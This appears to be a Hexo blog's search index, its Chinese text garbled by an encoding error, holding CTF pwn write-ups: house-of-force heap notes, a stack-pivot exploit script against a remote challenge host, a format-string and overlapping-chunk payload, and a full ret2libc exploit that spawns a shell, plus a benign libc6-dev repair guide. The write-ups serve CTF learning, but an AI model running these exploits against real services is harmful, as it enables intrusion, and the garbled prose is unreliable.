<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>200~house_of_force</title>
      <link href="/2024/11/03/house-of-force/"/>
      <url>/2024/11/03/house-of-force/</url>
      
        <content type="html"><![CDATA[<p>åˆ©ç”¨æ¡ä»¶ï¼šèƒ½æ§åˆ¶topchunk_sizeï¼Œèƒ½å¤Ÿè‡ªç”±æ§åˆ¶ç”³è¯·çš„å †å—å¤§å°ã€‚éœ€è¦çŸ¥é“top_chunkåœ°å€ä¸ç›®çš„åœ°å€çš„åç§»é‡ï¼Œå¦‚æœè¿˜ä¸å¯¹é½ï¼Œå³ç»“æœä¸æ˜¯0x0ç»“å°¾ï¼Œéœ€è¦å¤šå‡8ï¼Œç„¶åå‡å»SIZE_SZï¼ˆ8ï¼‰</p><p>ç»“æœï¼šèƒ½å°†topcunkçš„åœ°å€æ§åˆ¶åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼Œå†ç”³è¯·å†…å­˜å°±å¯ä»¥æ§åˆ¶è¿™ä¸ªåœ°å€çš„å€¼ã€‚</p><h4 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h4><p>å¯¹topchunk_sizeçš„æ£€æŸ¥ï¼Œ(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)</p><pre><code class="lang-c++">// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°victim = av-&gt;top;size   = chunksize(victim);// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123;    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    #è®¾ç½®top_chunkçš„å¤´ï¼Œé™„è¿‘å€¼ä¼šæœ‰æ‰€å˜åŒ–    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;&#125;</code></pre><p>æ‰€ä»¥æŠŠsizeæ”¹ä¸º-1ï¼Œåœ¨è¡¥ç ä¸­ä¸ºå¾ˆå¤§çš„æ•°ï¼Œèƒ½å¤Ÿæ»¡è¶³æ¡ä»¶</p><h5 id="æ–°çš„remainderå³top-chunkçš„åœ°å€-remainder-chunk-at-offset-victim-nb-ï¼Œéœ€è¦ç®—å‡ºtopchunkçš„åœ°å€å’Œç›®æ ‡åœ°å€çš„åç§»"><a href="#æ–°çš„remainderå³top-chunkçš„åœ°å€-remainder-chunk-at-offset-victim-nb-ï¼Œéœ€è¦ç®—å‡ºtopchunkçš„åœ°å€å’Œç›®æ ‡åœ°å€çš„åç§»" class="headerlink" title="æ–°çš„remainderå³top_chunkçš„åœ°å€  **remainder = chunk_at_offset(victim, nb);**ï¼Œéœ€è¦ç®—å‡ºtopchunkçš„åœ°å€å’Œç›®æ ‡åœ°å€çš„åç§»"></a>æ–°çš„remainderå³top_chunkçš„åœ°å€  <code>**remainder = chunk_at_offset(victim, nb);**</code>ï¼Œéœ€è¦ç®—å‡ºtopchunkçš„åœ°å€å’Œç›®æ ‡åœ°å€çš„åç§»</h5><h4 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h4><p>å¯¹ç”³è¯·çš„sizeçš„æ£€æŸ¥</p><pre><code class="lang-c++">/*   Check if a request is so large that it would wrap around zero when   padded and aligned. To simplify some other code, the bound is made   low enough so that adding MINSIZE will also not wrap around zero. */#è¿™é‡Œçš„reqå³æ˜¯nb.å¯¹reqçš„å¤§å°çš„æ£€æŸ¥ï¼Œ((unsigned long) (req)è¦å°äº (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))#define REQUEST_OUT_OF_RANGE(req)                                              \    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))/* pad request bytes into a usable size -- internal version *///MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1# å¯¹nbåŠ  SIZE_SZåŠ  MALLOC_ALIGN_MASK,æœ€åå’ŒMALLOC_ALIGN_MASKæŒ‰ä½ä¸å¯¹é½,è¿™é‡Œçš„SIZE_SZæ˜¯8#define request2size(req)                                                      \    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \         ? MINSIZE                                                             \         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)/*  Same, except also perform argument check */# reqä¸èƒ½å¤§äº -2 * MINSIZEï¼Œå¦åˆ™ä¼šæŠ¥é”™#define checked_request2size(req, sz)                                          \    if (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \        __set_errno(ENOMEM);                                                   \        return 0;                                                              \    &#125;                                                                          \    (sz) = request2size(req);</code></pre><h5 id="é¦–å…ˆ-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-ï¼Œå³æ— ç¬¦å·çš„nbè¦å°äºæ— ç¬¦å·çš„-2-MINSIZEï¼Œå³reqä¸èƒ½å¤§äº-2MINSIZE-ï¼Œä¸€èˆ¬éƒ½èƒ½æ»¡è¶³æ¡ä»¶ã€‚"><a href="#é¦–å…ˆ-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-ï¼Œå³æ— ç¬¦å·çš„nbè¦å°äºæ— ç¬¦å·çš„-2-MINSIZEï¼Œå³reqä¸èƒ½å¤§äº-2MINSIZE-ï¼Œä¸€èˆ¬éƒ½èƒ½æ»¡è¶³æ¡ä»¶ã€‚" class="headerlink" title="é¦–å…ˆ  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2  MINSIZE))ï¼Œå³æ— ç¬¦å·çš„nbè¦å°äºæ— ç¬¦å·çš„  **-2  MINSIZEï¼Œå³reqä¸èƒ½å¤§äº-2MINSIZE*ï¼Œä¸€èˆ¬éƒ½èƒ½æ»¡è¶³æ¡ä»¶ã€‚"></a>é¦–å…ˆ  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2 <em> MINSIZE))ï¼Œå³æ— ç¬¦å·çš„nbè¦å°äºæ— ç¬¦å·çš„  **-2 </em> MINSIZE<strong>ï¼Œå³reqä¸èƒ½å¤§äº</strong>-2<em>MINSIZE*</em>ï¼Œä¸€èˆ¬éƒ½èƒ½æ»¡è¶³æ¡ä»¶ã€‚</h5><h5 id="å…¶æ¬¡æ˜¯å¯¹reqçš„å¯¹é½çš„æ£€æŸ¥ï¼Œreqéœ€è¦æ˜¯0x0ç»“å°¾æ¥å¯¹é½ï¼Œå¦åˆ™å¾—å¤šå‡8"><a href="#å…¶æ¬¡æ˜¯å¯¹reqçš„å¯¹é½çš„æ£€æŸ¥ï¼Œreqéœ€è¦æ˜¯0x0ç»“å°¾æ¥å¯¹é½ï¼Œå¦åˆ™å¾—å¤šå‡8" class="headerlink" title="å…¶æ¬¡æ˜¯å¯¹reqçš„å¯¹é½çš„æ£€æŸ¥ï¼Œreqéœ€è¦æ˜¯0x0ç»“å°¾æ¥å¯¹é½ï¼Œå¦åˆ™å¾—å¤šå‡8"></a>å…¶æ¬¡æ˜¯å¯¹reqçš„å¯¹é½çš„æ£€æŸ¥ï¼Œreqéœ€è¦æ˜¯0x0ç»“å°¾æ¥å¯¹é½ï¼Œå¦åˆ™å¾—å¤šå‡8</h5><h5 id="req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-ï¼Œè¿™é‡Œçš„ç»“æœæ˜¯æœ€åç”³è¯·çš„å¤§å°ã€‚ç”±äº-req-SIZE-SZï¼ŒSIZE-SZæ˜¯8ï¼Œæ‰€ä»¥ç®—å‡ºåç§»åè¿˜éœ€è¦å‡å»8ï¼Œè™½ç„¶reqä¼šåŠ ä¸ŠMALLOC-ALIGN-MASKï¼Œä½†æ˜¯æœ€åä¼šè¢«å¯¹é½æ‰ï¼Œå°±ä¸ç”¨å¤šå‡æ‰MALLOC-ALIGN-MASKäº†"><a href="#req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-ï¼Œè¿™é‡Œçš„ç»“æœæ˜¯æœ€åç”³è¯·çš„å¤§å°ã€‚ç”±äº-req-SIZE-SZï¼ŒSIZE-SZæ˜¯8ï¼Œæ‰€ä»¥ç®—å‡ºåç§»åè¿˜éœ€è¦å‡å»8ï¼Œè™½ç„¶reqä¼šåŠ ä¸ŠMALLOC-ALIGN-MASKï¼Œä½†æ˜¯æœ€åä¼šè¢«å¯¹é½æ‰ï¼Œå°±ä¸ç”¨å¤šå‡æ‰MALLOC-ALIGN-MASKäº†" class="headerlink" title="((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)ï¼Œè¿™é‡Œçš„ç»“æœæ˜¯æœ€åç”³è¯·çš„å¤§å°ã€‚ç”±äº(req) + SIZE_SZï¼ŒSIZE_SZæ˜¯8ï¼Œæ‰€ä»¥ç®—å‡ºåç§»åè¿˜éœ€è¦å‡å»8ï¼Œè™½ç„¶reqä¼šåŠ ä¸ŠMALLOC_ALIGN_MASKï¼Œä½†æ˜¯æœ€åä¼šè¢«å¯¹é½æ‰ï¼Œå°±ä¸ç”¨å¤šå‡æ‰MALLOC_ALIGN_MASKäº†"></a>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)ï¼Œè¿™é‡Œçš„ç»“æœæ˜¯æœ€åç”³è¯·çš„å¤§å°ã€‚ç”±äº(req) + SIZE_SZï¼ŒSIZE_SZæ˜¯8ï¼Œæ‰€ä»¥ç®—å‡ºåç§»åè¿˜éœ€è¦å‡å»8ï¼Œè™½ç„¶reqä¼šåŠ ä¸ŠMALLOC_ALIGN_MASKï¼Œä½†æ˜¯æœ€åä¼šè¢«å¯¹é½æ‰ï¼Œå°±ä¸ç”¨å¤šå‡æ‰MALLOC_ALIGN_MASKäº†</h5><p><code>MALLOC_ALIGN</code> é€šå¸¸æŒ‡çš„æ˜¯å†…å­˜å—å¯¹é½çš„è¦æ±‚ã€‚å¦‚æœreqä¸å¯¹é½ï¼Œä¸æ˜¯0x0ç»“å°¾çš„ï¼Œéœ€è¦å¤šå‡æ‰8</p><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p>åªå¼€äº†æ ˆä¸Šçš„ä¿æŠ¤</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104192949440.png" alt="image-20241104192949440"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193057354.png" alt="image-20241104193057354"></p><p>è¿™é‡Œä¼šæŠŠå †çš„åœ°å€ç»™åˆ°v2çš„æŒ‡é’ˆï¼Œåç»­ä¼šæ‰“å°å‡ºæ¥</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193219359.png" alt="image-20241104193219359"></p><p>ğŸ•â…§é¢˜ç›®ï¼Œè°ƒè¯•çš„æ—¶å€™å®Œå…¨ä¸æ˜¯é¢˜ç›®é€»è¾‘ï¼Œç®—äº†ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/10/29/pwn2%20short/"/>
      <url>/2024/10/29/pwn2%20short/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn2-short"><a href="#pwn2-short" class="headerlink" title="pwn2 short"></a>pwn2 short</h1><p>å¾ˆç®€å•çš„32ä½æ ˆè¿ç§»ï¼Œè¿˜ç•™äº†ä¸ªåé—¨</p><p>è¿™é‡Œè·å¾—æ ˆåœ°å€</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241029170723988.png" alt="image-20241029170723988"></p><p>æŠŠbin/shçš„åœ°å€æ”¾è¿”å›åœ°å€åé¢å°±ok</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn&quot;,43744)#p=process(&quot;./short&quot;)context.log_level=&quot;debug&quot;p.sendlineafter(&#39;username: &#39;,&#39;admin&#39;)p.sendlineafter(&#39;password: &#39;,&#39;admin123&#39;)p.recvuntil(&#39;0x&#39;)stack=int(p.recv(8),16)print(hex(stack))pop_edi=0x0804884apop_ebx=0x08048411gift=0x080485E6leave=0x08048674binsh=0x0804A038 payload=p32(gift)+p32(0)+p32(binsh)+b&#39;a&#39;*68+p32(stack-4)+p32(leave)#gdb.attach(p)sleep(1)p.sendlineafter(&quot;msg:&quot;,payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>overlapping_chunks</title>
      <link href="/2024/10/21/overlapping_chunks/"/>
      <url>/2024/10/21/overlapping_chunks/</url>
      
        <content type="html"><![CDATA[<p>å¤§å¤šéƒ½æ˜¯å †æº¢å‡ºçš„æƒ…å†µä¸‹ï¼Œchunké‡Šæ”¾å‰æˆ–é‡Šæ”¾åæ”¹å˜sizeçš„å€¼ï¼Œå†ç”³è¯·çš„æ—¶å€™é€ æˆä¸¤ä¸ªå †å—æœ‰é‡åˆçš„åœ°æ–¹ï¼Œæœ‰æ—¶å€™éœ€è¦æ”¹å˜å¯¹åº”ä¸‹ä¸€ä¸ªå †çš„pre_sizeç»•è¿‡æ£€æŸ¥ï¼Œè™½è¯´åœ¨libc2.29ä»¥åæ‰å‡ºç°ï¼Œä½†æœ‰æ—¶å€™2.23çš„ç‰ˆæœ¬è¿˜æ˜¯ä¼šå› æ­¤è€ŒæŠ¥é”™ã€‚æ‰€ä»¥å°½å¯èƒ½çš„åœ¨ä¸‹ä¸€ä¸ªchunkçš„pre_sizeä½æ”¹æˆæˆ‘ä»¬çš„size.</p><pre><code class="lang-c++">/* consolidate backward */    if (!prev_inuse(p)) &#123;      prevsize = prev_size (p);      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      /* åä¸¤è¡Œä»£ç åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­åŠ å…¥ï¼Œåˆ™ 2 çš„ç¬¬äºŒç§æ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ 2.28 åŠä¹‹å‰éƒ½æ²¡æœ‰é—®é¢˜ */      if (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);      unlink_chunk (av, p);    &#125;</code></pre><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p>è¯¥ç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥çš„ 64 ä½ç¨‹åºï¼Œä¸»è¦å¼€å¯äº† Canary ä¸ NX ä¿æŠ¤.</p><p>ç¨‹åºçš„æœ€åæœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåªèƒ½ç”¨ä¸€æ¬¡ï¼Œç”¨äºæ³„éœ²libcå’Œåœ¨finiçš„åœ°æ–¹å†™ä¸Šmainå‡½æ•°åœ°å€</p><p>è¿™é‡Œè¾“å…¥sæ˜¯èƒ½å†™ä¸Šæ ˆçš„åœ°æ–¹ï¼Œè¿™é‡Œè¾“å…¥finiçš„åœ°å€</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021202201568.png" alt="image-20241021202201568"></p><p>ç®—å‡ºåç§»æ˜¯13</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021210331631.png" alt="image-20241021210331631"></p><p>è¿™é‡Œåªå¼ºè°ƒæ„é€ çš„fake_chunk</p><pre><code class="lang-py">payload=b&#39;%2828c%13$hnkk%31$p&#39;payload=payload.ljust(0x88,b&#39;b&#39;)payload+=p64(0x151)payload=payload.ljust(0x1d0,b&#39;\x41&#39;)+p64(0x150)+p64(0x41)+p64(0)*6+p64(0x40)+p64(0x31)</code></pre><p>ç”³è¯·å †çš„è¿‡ç¨‹ä¸­æœ‰å †æº¢å‡ºå¯ä»¥æ›´æ”¹ä¸‹ä¸€ä¸ª å †çš„sizeï¼Œæ”¹æˆä¸‹é¢ç‰¹æ®Šçš„å †çš„sizeï¼Œæ ¹æ®é¢˜ç›®ç»™å¤§å°æ”¹ã€‚</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220811817.png" alt="image-20241021220811817"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220706913.png" alt="image-20241021220706913"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>heapcreator</title>
      <link href="/2024/10/17/heapcreator/"/>
      <url>/2024/10/17/heapcreator/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>stdout</title>
      <link href="/2024/09/21/stdout/"/>
      <url>/2024/09/21/stdout/</url>
      
        <content type="html"><![CDATA[<p>è¿™é‡Œstdoutç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯0ï¼Œå°±æ˜¯æ ‡å‡†è¾“å‡ºå…¨ç¼“å†²ï¼Œç¼“å†²åŒºè¢«å¡«æ»¡æ‰èƒ½è¿›è¡Œå›æ˜¾</p><p>åˆ·æ–°ç¼“å†²åŒºæœ‰å‡ ç§åŠæ³•</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190505843.png" alt="image-20240922190505843"></p><p>èƒ½å¤Ÿæº¢å‡º8å­—èŠ‚</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190659808.png" alt="image-20240922190659808"></p><p>ä¸€ä¸ªæ²¡ä»€ä¹ˆç”¨çš„å‡½æ•°</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190726730.png" alt="image-20240922190726730"></p><p>é‚£ä¹ˆåªèƒ½å°†ç¼“å†²åŒºå¡«æ»¡ï¼Œåˆšå¼€å§‹æƒ³çš„æ˜¯ç”¨vulnå‡½æ•°ä¸æ–­è¾“å…¥</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202629304.png" alt="image-20240922202629304"></p><p>retçš„æ“ä½œæ˜¯pop ripï¼Œrsp=rsp+8, æŒ‡å‘0x0x7fff153a5588.  endbr64æŒ‡ä»¤rspæ˜¯ä¸åŠ¨çš„ï¼Œpush rbpårbpå˜æˆäº†åŸæ¥è¿”å›åœ°å€çš„ä½ç½®,å†æ¬¡è°ƒç”¨ç›¸åŒçš„è¾“å…¥ä¹Ÿåªæ˜¯è®©rbp+8,å³æ¯æ¬¡</p><pre><code class="lang-py">for i in range(20):    payload=b&#39;c&#39;*0x28+p64(vul)    p.send(payload)    print(i)</code></pre><p>ä¹Ÿåªæ˜¯è®©rbp+8ç§»åŠ¨</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202708003.png" alt="image-20240922202708003"></p><p>ç¬¬äºŒæ¬¡çš„rbp</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922203434985.png" alt="image-20240922203434985"></p><p>åªæ˜¯è°ƒç”¨vulnçš„è¯æ—¶ä¸ä¼šå›æ˜¾çš„ã€‚</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922210006385.png" alt="image-20240922210006385"></p><p>å…¶å®ä¸æ˜¯ç†æƒ³å½“ç„¶çš„å¡«å……ï¼Œå¾—è°ƒç”¨extendå‡½æ•°å¡«å……ç¼“å†²åŒºã€‚é‚£ä¹ˆå°±åªèƒ½ä¸æ–­è°ƒç”¨extendå‡½æ•°æŠŠç¼“å†²åŒºå¡«æ»¡ã€‚</p><p>è°ƒç”¨extendæ—¶ç¬¬äºŒåæ¬¡æ—¶çš„æ ˆ</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922205219910.png" alt="image-20240922205219910"></p><p>exp</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./pwn&quot;)context.log_level=&quot;debug&quot;elf=ELF(&#39;./pwn&#39;)libc=ELF(&#39;./libc-2.31.so&#39;)extend=0x401287vul=0x40125Dpop_rdi=0x4013d3puts_got=elf.got[&#39;puts&#39;]puts=elf.plt[&#39;puts&#39;]payload=b&#39;a&#39;*0x58+p64(vul)p.send(payload)payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(extend)+p64(vul)p.send(payload)for i in range(21):    payload=b&#39;c&#39;*0x28+p64(extend)+p64(vul)    p.send(payload)p.recvuntil(&#39;stdout???&#39;)p.recvline()puts_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))base=puts_addr-0x10dfc0 #libc.sym[&#39;puts&#39;]system=base+libc.sym[&#39;system&#39;]binsh=base+next(libc.search(b&#39;bin/sh&#39;))gdb.attach(p)pause()payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(system)p.send(payload)print(hex(libc.sym[&#39;puts&#39;]))print(&#39;put&#39;+hex(puts_addr))p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è§£å†³libc6è½¯ä»¶åŒ…å’Œlibc6-devä¸åŒ¹é…çš„é—®é¢˜</title>
      <link href="/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰åœ¨å­¦vmå†…æ ¸è°ƒè¯•çš„æ—¶å€™ï¼Œä¸å°å¿ƒæŠŠlibc6-devä¹‹ç±»çš„åŒ…ç»™åˆ æ‰äº†ï¼Œå¯¼è‡´åé¢gccç¼–è¯‘ä¸äº†ï¼Œé‡æ–°ä¸‹è½½libc6-devæ—¶ï¼Œä¼šå¼¹å‡ºè¿™æ ·çš„æŠ¥é”™ï¼Œè¿™ç§æŠ¥é”™ä¹‹å‰å¾ˆå¸¸è§ã€‚</p><pre><code class="lang-python">ä¸‹åˆ—è½¯ä»¶åŒ…æœ‰æœªæ»¡è¶³çš„ä¾èµ–å…³ç³»ï¼š libc6-dev : ä¾èµ–: libc6 (= 2.27-3ubuntu1.6) ä½†æ˜¯ 2.35-0ubuntu3 æ­£è¦è¢«å®‰è£…             ä¾èµ–: libc-dev-bin (= 2.27-3ubuntu1.6)E: æ— æ³•ä¿®æ­£é”™è¯¯ï¼Œå› ä¸ºæ‚¨è¦æ±‚æŸäº›è½¯ä»¶åŒ…ä¿æŒç°çŠ¶ï¼Œå°±æ˜¯å®ƒä»¬ç ´åäº†è½¯ä»¶åŒ…é—´çš„ä¾èµ–å…³ç³»ã€‚</code></pre><p>æœ€æœ¬è´¨çš„åŸå› å°±æ˜¯å·²å®‰è£…çš„libc6ç‰ˆæœ¬æ˜¯2.35-0ubuntu3ï¼Œä½†æ˜¯è¦å®‰è£…çš„libc6-devæ‰€è¦çš„ä¾èµ–æ˜¯libc6å’Œlibc-dev-binçš„ç‰ˆæœ¬éƒ½æ˜¯2.27,å½“åˆæƒ³è¿‡æŠŠlibc6é™çº§çš„ï¼Œå› ä¸ºlibc6æ˜¯è½¯ä»¶åŒ…ï¼Œæœ‰å¾ˆå¤šä¾èµ–å…³ç³»ï¼Œç»“æœç³»ç»Ÿå¥”æºƒäº†ï¼Œè¿˜åˆšå¥½æ²¡æå‰æ‹å¿«ç…§ï¼Œåªæœ‰å¾ˆä¹…ä¹‹å‰çš„ã€‚</p><p>libc6å°±æ˜¯ä¸€ä¸ªè½¯ä»¶åŒ…åç§°ï¼ŒåŒ…å«cæ ‡å‡†åº“çš„æ‰€æœ‰åŠŸèƒ½ï¼ŒåŒ…å«æœ‰å¾ˆå¤šåº“æ–‡ä»¶ï¼Œå¦‚libc.so.6ï¼Œæ˜¯åº•å±‚ä»£ç å¦‚prinfå‡½æ•°çš„å®ç°ã€‚é€šå¸¸å­˜æ”¾åœ¨/libç›®å½•ä¸‹ï¼Œç³»ç»Ÿæ ¸å¿ƒåº“çš„å­˜æ”¾ç›®å½•ã€‚</p><p>libc6-devå«æœ‰å¾ˆå¤šcæ ‡å‡†åº“ï¼Œå¦‚stdio.h,math.h.åŒ…å«å¾ˆå¤šå¤´æ–‡ä»¶ã€‚è§£å‹æ”¾åˆ°/usr/include/ã€‚</p><p>/usr/lib ç›®å½•æ˜¯ç”¨æˆ·çº§åº“çš„å­˜æ”¾ç›®å½•ï¼Œè¿™äº›åº“æ–‡ä»¶æ˜¯ç”¨æˆ·å®‰è£…çš„è½¯ä»¶åŒ…æ‰€éœ€çš„ï¼Œä¾‹å¦‚å›¾å½¢åº“ã€æ•°æ®åº“åº“ã€å¼€å‘åº“ç­‰ã€‚è¿™äº›åº“æ–‡ä»¶é€šå¸¸æ˜¯ç”¨æˆ·å®‰è£…çš„è½¯ä»¶åŒ…æ‰€éœ€çš„ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿæ ¸å¿ƒç»„ä»¶æ‰€éœ€çš„ã€‚</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918204615913.png" alt="image-20240918204615913"></p><p>æœ€æ­£ç¡®çš„åŠæ³•å°±æ˜¯ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„libc6-dev.debè§£å‹ï¼Œè¦å’Œå·²å®‰è£…çš„libc6ç‰ˆæœ¬åŒ¹é…ï¼Œå½“æ—¶æ˜¯ç›´æ¥æ‰¾äº†ç½‘ç«™<a href="http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/">glibcåº“</a> ä¸‹è½½libc6-dev.debï¼Œä½†æ˜¯æ‰¾ä¸åˆ°2.35ç‰ˆæœ¬çš„ï¼Œåé¢ç»ˆäºåœ¨package.ubuntu.comæ‰¾åˆ°,ç‚¹è¿™ä¸¤ä¸ªä¸‹è½½</p><pre><code class="lang-py">https://packages.ubuntu.com/jammy/libc6-dev</code></pre><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210634377.png" alt="image-20240918210634377"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210702629.png" alt="image-20240918210702629"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210853312.png" alt="image-20240918210853312"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211010603.png" alt="image-20240918211010603"></p><p>è§£å‹åˆ°/tmp/libc6-dev</p><pre><code class="lang-py">mkdir /tmp/libc6-devdpkg-deb -x libc6-dev_2.35-0ubuntu3.8_amd64.deb /tmp/libc6-devsudo rsync -av /tmp/libc6-dev/usr/include/ /usr/include/         #ç§»åŠ¨å¤´æ–‡ä»¶sudo rsync -av /tmp/libc6-dev/usr/share/ /usr/share/             #ç§»åŠ¨å…±äº«æ•°æ®æ–‡ä»¶sudo rsync -av /tmp/libc6-dev/usr/lib/ /usr/lib/                 #ç§»åŠ¨ç”¨æˆ·çº§åº“æ–‡ä»¶ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°ç‚¹ã€‚</code></pre><p>åŒç†ï¼Œlibc-dev-binä¹Ÿè§£å‹</p><pre><code class="lang-py">mkdir /tmp/libc-dev-bindpkg-deb -x libc-dev-bin_2.35-0ubuntu3.8_amd64.deb /tmp/libc-dev-binsudo rsync -av /tmp/libc-dev-bin/usr/ /usr/                      #ä¸»è¦æ˜¯ä¸€äº›å·¥å…·è„šæœ¬</code></pre><p>åé¢æŠŠtmpç›®å½•ä¸‹çš„è¿™ä¸¤ä¸ªä¸´æ—¶æ–‡ä»¶åˆ äº†å°±å¥½ã€‚</p><p>åé¢æˆ‘è¯•ç€gccç¼–è¯‘çš„æ—¶å€™ï¼Œè¿˜æ˜¯é‡è§äº†ä¸ªè€é”™è¯¯</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211756419.png" alt="image-20240918211756419"></p><pre><code class="lang-py">gcc 1.c -o 1/usr/bin/ld: æ‰¾ä¸åˆ° Scrt1.o: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•/usr/bin/ld: æ‰¾ä¸åˆ° crti.o: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•collect2: error: ld returned 1 exit status</code></pre><p>é€šè¿‡æŸ¥æ‰¾å‘ç°ï¼Œå®ƒåœ¨/tmp/libc6-dev/usr/lib/x86_64-linux-gnu è¿™ä¸ªç›®å½•é‡Œï¼Œè¿™ä¸ªæ­£æ˜¯åº“æ–‡ä»¶çš„ä½ç½®ï¼ŒæŠŠè¿™äº›åº“æ–‡ä»¶ç§»åŠ¨åˆ°/usr/lib/x86_64-linux-gnu/ç›®å½•å°±å¥½</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211910349.png" alt="image-20240918211910349"></p><p>æœ€åï¼Œç¼–è¯‘æˆåŠŸ</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918212931846.png" 